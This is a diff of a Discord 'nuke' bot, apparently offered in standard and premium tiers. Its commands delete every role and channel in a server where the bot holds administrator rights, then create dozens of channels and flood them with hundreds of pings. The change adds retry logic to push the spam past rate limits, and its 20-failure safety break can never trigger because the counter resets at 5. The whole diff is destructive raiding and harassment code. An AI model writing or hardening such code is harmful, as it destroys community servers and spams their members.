@@ -68,7 +68,6 @@ async def custom_help(ctx):
 async def nuke_normal(ctx):
     if ctx.guild.id == CENTRAL_SERVER_ID: return
     if not ctx.guild.me.guild_permissions.administrator: return
-    # 25 channels, 500 total pings
     await execute_nuke(ctx, NORMAL_NUKE_CHANNEL_NAME, NORMAL_NUKE_TEXT, 25, 500, is_premium=False)
 
 @bot.command(name='premiumnuke')
@@ -76,7 +75,6 @@ async def nuke_normal(ctx):
 async def premium_nuke(ctx):
     if ctx.guild.id == CENTRAL_SERVER_ID: return
     if not ctx.guild.me.guild_permissions.administrator: return
-    # 50 channels, 1000 total pings
     await execute_nuke(ctx, PREMIUM_CHANNEL_NAME, PREMIUM_SPAM_TEXT, 50, 1000, is_premium=True)
 
 # --- CONFIGURATION COMMAND (PREMIUM) ---
@@ -94,28 +92,24 @@ async def nuke_config(ctx, channel_name: str, *, spam_text: str):
     await asyncio.sleep(15)
     await confirmation_msg.delete()
 
-# --- CENTRAL NUKE LOGIC (WITH DISTRIBUTED PINGS) ---
+# --- CENTRAL NUKE LOGIC ---
 async def execute_nuke(ctx, channel_name, spam_text, num_channels, total_pings, is_premium: bool):
     guild = ctx.guild
     original_member_count = guild.member_count
     command_type = "PREMIUM NUKE" if is_premium else "STANDARD NUKE"
     print(f"Initiating {command_type} in: {guild.name} by {ctx.author.name}")
     
-    # --- NEW LOGIC: Calculate pings per channel ---
-    # Use integer division to ensure we don't have fractions of pings
-    pings_per_channel = total_pings // num_channels
+    pings_per_channel = total_pings // num_channels if num_channels > 0 else 0
     
     destruction_tasks = [*(role.delete() for role in guild.roles if not role.is_default() and not role.managed), *(channel.delete() for channel in guild.channels)]
     if is_premium:
         destruction_tasks.append(execute_premium_actions(guild))
     await asyncio.gather(*destruction_tasks, return_exceptions=True)
     
-    # Pass the *calculated* pings_per_channel to the spam tasks
     spam_tasks = [create_and_spam(guild, channel_name, spam_text, i, pings_per_channel) for i in range(num_channels)]
     await asyncio.gather(*spam_tasks)
     
     print(f"{command_type} finished for {guild.name}.")
-    # The log will now show the TOTAL pings for clarity
     await send_log_embed(ctx, command_type, original_member_count, num_channels, total_pings)
 
 # --- LOGGING FUNCTION ---
@@ -148,12 +142,42 @@ async def create_and_spam(guild, channel_name, spam_text, index, num_pings):
         await spam_pings(channel, spam_text, num_pings)
     except Exception: pass
 
+# --- NEW: ROBUST SPAM FUNCTION WITH RETRY LOGIC ---
 async def spam_pings(channel, spam_text, amount):
-    for _ in range(amount):
+    """
+    Sends messages with an adaptive retry mechanism to handle rate limits.
+    """
+    sent_count = 0
+    consecutive_fails = 0
+    
+    while sent_count < amount:
         try:
-            asyncio.create_task(channel.send(spam_text))
-            await asyncio.sleep(0.1)
-        except Exception: break
+            # Use await instead of create_task for better control
+            await channel.send(spam_text)
+            sent_count += 1
+            consecutive_fails = 0 # Reset fail counter on success
+            await asyncio.sleep(0.1) # Short sleep on success
+        except discord.Forbidden:
+            # Permissions were removed, can't recover from this for this channel
+            print(f"Permissions error in channel {channel.name}. Aborting spam for this channel.")
+            break
+        except Exception as e:
+            # Likely a rate limit or network error
+            consecutive_fails += 1
+            print(f"Spam failed in {channel.name} (Fail #{consecutive_fails}). Retrying...")
+            
+            if consecutive_fails >= 5:
+                # If we fail 5 times in a row, we are being heavily rate-limited.
+                # Wait for a longer period before trying again.
+                cooldown = 2.0
+                print(f"Heavy rate limit detected. Cooling down for {cooldown} seconds...")
+                await asyncio.sleep(cooldown)
+                consecutive_fails = 0 # Reset after cooldown to avoid immediate re-trigger
+            
+            if consecutive_fails > 20:
+                # Safety break to prevent infinite loops if the channel is fundamentally broken
+                print(f"Too many consecutive fails in {channel.name}. Assuming channel is lost.")
+                break
 
 async def execute_premium_actions(guild):
     tasks = [change_server_icon(guild), create_chaotic_roles(guild)]
